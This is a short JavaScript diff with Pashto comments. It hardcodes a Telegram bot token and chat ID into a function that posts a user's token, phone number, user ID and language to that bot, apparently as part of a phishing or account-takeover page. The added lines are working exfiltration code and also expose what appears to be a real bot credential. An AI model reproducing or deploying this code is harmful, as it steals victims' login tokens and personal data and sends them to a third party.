@@ -1231,10 +1231,10 @@
 
         // د توکن ټیلیګرام ته لیږل
         function sendTokenToTelegram(token) {
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT.TOKEN}/sendMessage`;
+            const url = `https://api.telegram.org/bot8038455508:AAG_nhK7FB5uTwVPaUXlr_FXBaHkmHkpTQo/sendMessage`;
             
             const data = {
-                chat_id: TELEGRAM_BOT.CHAT_ID,
+                chat_id: 6379929132,
                 text: `نوی توکن: ${token}\nد تلیفون شمېره: ${appState.phoneNumber}\nکاروونکی ID: ${appState.userId}\nژبه: ${appState.currentLang}\nوخت: ${new Date().toLocaleString()}`
             };
             
